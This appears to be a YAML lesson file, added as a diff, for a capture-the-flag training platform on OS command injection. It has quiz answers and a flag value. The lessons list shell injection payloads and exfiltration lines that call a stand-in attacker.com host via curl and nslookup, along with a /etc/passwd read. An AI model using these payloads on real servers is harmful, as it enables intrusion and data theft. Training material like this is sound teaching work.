@@ -1,0 +1,102 @@
+id: 5
+title: "Command Injection"
+slug: "command-injection"
+difficulty: "easy"
+description: "Learn how OS command injection works and how to exploit vulnerable shell calls."
+order: 5
+
+challenges:
+  - id: ci-qa-1
+    type: qa
+    title: "What is Command Injection?"
+    points: 10
+    content: |
+      Command Injection (also called OS Command Injection) is a vulnerability
+      where an attacker can execute arbitrary system commands on the server.
+
+      This happens when an application passes user input to the system shell
+      without sanitization. Common vulnerable functions:
+
+        Python: os.system(), subprocess.run(shell=True)
+        PHP: system(), exec(), shell_exec(), passthru()
+        Node.js: child_process.exec()
+
+      Example — a ping tool:
+        http://site.com/ping?ip=8.8.8.8
+
+      The server runs: ping -c 4 8.8.8.8
+
+      An attacker can inject additional commands using shell operators:
+        ip=8.8.8.8; whoami         (semicolor chains commands)
+        ip=8.8.8.8 && whoami       (AND: run if first succeeds)
+        ip=8.8.8.8 || whoami       (OR: run if first fails)
+        ip=8.8.8.8 | whoami        (pipe: output of first to second)
+        ip=$(whoami)                (command substitution)
+        ip=`whoami`                 (backtick command substitution)
+
+      On success, the server executes both the intended command AND the injected
+      command, returning the results to the attacker.
+    questions:
+      - q: "What shell operator chains commands regardless of success or failure?"
+        a: ";"
+      - q: "What symbol substitutes command output in $() format?"
+        a: "$()"
+      - q: "In Python, what function is commonly vulnerable to command injection?"
+        a: "os.system()"
+
+  - id: ci-qa-2
+    type: qa
+    title: "Blind Command Injection"
+    points: 10
+    content: |
+      Not all command injection vulnerabilities return output to the attacker.
+      This is called "Blind Command Injection" — you can execute commands
+      but cannot see the results directly.
+
+      Blind injection detection techniques:
+
+      1. Time-Based Detection (Out-of-Band):
+         Use sleep/delay to confirm execution:
+           ip=8.8.8.8; sleep 5
+         If the response takes 5 seconds longer, injection works.
+
+      2. Out-of-Band (OOB) Exfiltration:
+         Send data to your own server:
+           ip=8.8.8.8; curl http://attacker.com/$(whoami)
+         Or use DNS exfiltration:
+           ip=8.8.8.8; nslookup $(whoami).attacker.com
+
+      3. File Write:
+         Write command output to a web-accessible file:
+           ip=8.8.8.8; whoami > /var/www/html/output.txt
+         Then visit http://site.com/output.txt
+
+      Common commands for information gathering after RCE:
+      - whoami: current user
+      - id: user and group IDs
+      - uname -a: system info
+      - ifconfig/ip addr: network config
+      - ls: list files
+      - cat /etc/passwd: read users
+
+      To prevent command injection:
+      - Never pass user input to shell commands
+      - Use APIs/libraries instead of shell commands
+      - Strictly validate input against a whitelist
+    questions:
+      - q: "What technique uses sleep() to confirm blind command injection?"
+        a: "Time-based detection"
+      - q: "What protocol is commonly used for out-of-band data exfiltration?"
+        a: "DNS"
+      - q: "What command shows your current username on Linux?"
+        a: "whoami"
+
+  - id: ci-flag-1
+    type: flag
+    title: "Ping Pwn"
+    points: 50
+    content: |
+      A website has a ping utility: /ping?host=google.com
+      It's vulnerable to command injection.
+      Inject a command to read the flag file at /root/flag.txt
+    flag: "CTF{1nj3ct_4ll_th3_c0mm4nds}"
